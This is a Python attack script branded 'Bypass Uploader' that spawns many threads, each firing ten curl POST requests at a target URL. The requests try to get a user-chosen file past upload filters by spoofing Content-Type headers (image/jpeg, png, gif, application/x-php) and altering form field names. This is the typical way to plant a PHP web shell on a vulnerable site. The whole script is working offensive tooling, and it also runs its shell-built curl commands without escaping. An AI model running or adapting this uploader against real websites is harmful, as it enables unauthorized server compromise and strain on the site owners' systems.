import subprocess
import sys
import threading
import os

RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
RESET = "\033[0m"

print(f"{BLUE}===========================================")
print("  Sheikh Nightshader's Bypass Uploader")
print("===========================================\n" + RESET)

if len(sys.argv) < 4:
    print(f"{RED}Usage: python {sys.argv[0]} <URL> <filename> <threads>{RESET}")
    sys.exit(1)

url = sys.argv[1]
filename = sys.argv[2]
threads_count = int(sys.argv[3])

if not os.path.isfile(filename):
    print(f"{RED}File '{filename}' not found!{RESET}")
    sys.exit(1)

def upload_file():
    try:
        commands = [
            f'curl -X POST -F "file=@{filename}" {url}',
            f'curl -X POST -H "Content-Type: image/jpeg" -F "file=@{filename};type=image/jpeg" {url}',
            f'curl -X POST -H "Content-Type: image/png" -F "file=@{filename};type=image/png" {url}',
            f'curl -X POST -H "Content-Type: image/gif" -F "file=@{filename};type=image/gif" {url}',
            f'curl -X POST -H "Content-Type: application/x-php" -F "file=@{filename};type=application/x-php" {url}',
            f'curl -X POST -H "Content-Type: application/octet-stream" -F "file=@{filename};type=application/octet-stream" {url}',
            f'curl -X POST -H "Content-Type: multipart/form-data" -F "file=@{filename};type=image/jpeg" {url}',
            f'curl -X POST -H "Content-Disposition: form-data; name=\\"uploaded\\"; filename=\\"{filename}\\"" -H "Content-Type: application/x-php" -F "file=@{filename}" {url}',
            f'curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -F "file=@{filename}" {url}',
            f'curl -X POST -H "Content-Type: image/jpeg" -F "uploaded=@{filename}" {url}',
        ]

        for command in commands:
            print(f"{BLUE}Trying command: {command}{RESET}")
            response = subprocess.run(command, shell=True, capture_output=True, text=True)

            if response.returncode == 0:
                print(f"{GREEN}File '{filename}' uploaded successfully with command: {command}{RESET}")
                print(response.stdout)
            else:
                print(f"{RED}Failed to upload '{filename}' with command: {command}. Error: {response.stderr}{RESET}")

    except Exception as e:
        print(f"{RED}Error uploading file: {e}{RESET}")

print(f"{BLUE}Starting upload with {threads_count} threads...{RESET}")
threads = []
for _ in range(threads_count):
    thread = threading.Thread(target=upload_file)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print(f"{BLUE}Upload completed.{RESET}")
